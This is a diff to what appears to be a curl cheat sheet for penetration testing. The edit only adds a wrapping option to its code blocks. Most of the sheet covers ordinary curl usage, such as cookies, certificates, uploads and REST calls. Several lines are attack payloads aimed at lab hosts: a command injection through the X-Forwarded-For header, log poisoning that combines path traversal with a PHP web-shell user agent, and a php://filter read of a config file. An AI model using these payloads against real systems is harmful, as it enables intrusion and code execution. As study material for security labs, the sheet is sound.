@@ -114,13 +114,13 @@ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://www.example.net:PORT
 ```
 {% endcode %}
 
-{% code title="Save Cookie in to a file" %}
+{% code title="Save Cookie in to a file" overflow="wrap" %}
 ```bash
 curl -X POST -d "flag=UHC{F1rst_5tep_2_Qualify}" -c cookies.txt -v http://10.10.11.128/challenge.php
 ```
 {% endcode %}
 
-{% code title="Use cookie from the file" %}
+{% code title="Use cookie from the file" overflow="wrap" %}
 ```bash
 curl -H "X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.16.7;" -b cookies.txt -v http://10.10.11.128/firewall.php
 ```
@@ -154,7 +154,7 @@ curl -E /path/to/client-cert.pem https://secure.example.com
 ```
 {% endcode %}
 
-{% code title="Specify the Certificate format" %}
+{% code title="Specify the Certificate format" overflow="wrap" %}
 ```bash
 curl -E /path/to/client-cert.pem --cert-type PEM|DER|ENG https://secure.example.com
 ```
@@ -172,7 +172,7 @@ curl -k -v --cacert /path/to/ca_certificate.crt https://example.com
 ```
 {% endcode %}
 
-{% code title="Skip SSL + verbose + Client Certificate & Key" %}
+{% code title="Skip SSL + verbose + Client Certificate & Key" overflow="wrap" %}
 ```bash
 curl -k -v --cert client_cert_and_key.pem --cert-type PEM https://test.me
 ```
@@ -208,13 +208,13 @@ curl -u :YOUR_TOKEN -T example.txt https://example.com/upload
 ```
 {% endcode %}
 
-{% code title="File Upload + Custom Header" %}
+{% code title="File Upload + Custom Header" overflow="wrap" %}
 ```bash
 curl -H "Authorization: Bearer YOUR_TOKEN" -T example.txt https://example.com/upload
 ```
 {% endcode %}
 
-{% code title="File Upload + Multiple Custom Headers" %}
+{% code title="File Upload + Multiple Custom Headers" overflow="wrap" %}
 ```bash
 curl -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -T example.txt https://example.com/upload
 ```
@@ -232,7 +232,7 @@ curl -F "file=@example.txt" https://example.com/upload
 ```
 {% endcode %}
 
-{% code title="File Upload + Additional Query Parameters" %}
+{% code title="File Upload + Additional Query Parameters" overflow="wrap" %}
 ```bash
 curl -T example.txt "https://example.com/upload?user=alice&timestamp=2024"
 ```
@@ -274,19 +274,19 @@ curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq
 ```
 {% endcode %}
 
-{% code title="POST + Cookie" %}
+{% code title="POST + Cookie" overflow="wrap" %}
 ```bash
 curl -X POST -d '{"search":"london"}' -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' -H 'Content-Type: application/json' http://www.example.net:PORT/search.php
 ```
 {% endcode %}
 
-{% code title="Create Entry" %}
+{% code title="Create Entry" overflow="wrap" %}
 ```bash
 curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
 ```
 {% endcode %}
 
-{% code title="Update Entry" %}
+{% code title="Update Entry" overflow="wrap" %}
 ```bash
 curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
 ```
@@ -316,25 +316,25 @@ curl -k -v --http2 <URL>
 ```
 {% endcode %}
 
-{% code title="Stealth + Path Traversal + PHP Revshell Header" %}
+{% code title="Stealth + Path Traversal + PHP Revshell Header" overflow="wrap" %}
 ```bash
 curl -s "http://83.136.249.227:31647/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log" -A "<?php system($_GET['cmd']); ?>"
 ```
 {% endcode %}
 
-{% code title="POST + Key-Value pairs Content Header" %}
+{% code title="POST + Key-Value pairs Content Header" overflow="wrap" %}
 ```bash
 curl http://example.net:44626/example.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'
 ```
 {% endcode %}
 
-{% code title="Loop Multiple Queries" %}
+{% code title="Loop Multiple Queries" overflow="wrap" %}
 ```bash
 for i in {1..100}; do echo -n "Post $i: "; curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=$i | tr -s '\n'; done  | tee post-name-list
 ```
 {% endcode %}
 
-{% code title="Wrapper + base64 Encode + Regex" %}
+{% code title="Wrapper + base64 Encode + Regex" overflow="wrap" %}
 ```bash
 curl http://94.237.55.12:38697/index.php\?language\=php://filter/read\=convert.base64-encode/resource\=configure |  awk 'BEGIN { body=0 } /^$/ { body=1 } body { print }' | grep -o '[A-Za-z0-9+/=]\{20,\}'
 ```
